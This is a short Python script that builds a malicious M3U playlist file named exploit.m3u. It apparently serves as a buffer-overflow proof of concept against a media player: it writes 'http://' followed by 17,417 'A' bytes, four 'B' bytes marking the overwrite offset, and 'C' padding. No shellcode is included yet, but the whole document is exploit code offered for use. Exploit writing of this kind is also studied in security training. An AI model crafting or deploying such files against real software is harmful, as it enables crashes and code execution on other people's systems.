#! /usr/bin/python

buffer = "http://"
buffer += "A"*17417
buffer += "B"*4
buffer += "C"*(18000-17417-4)

f=open("exploit.m3u","w")
f.write(buffer);
f.close()
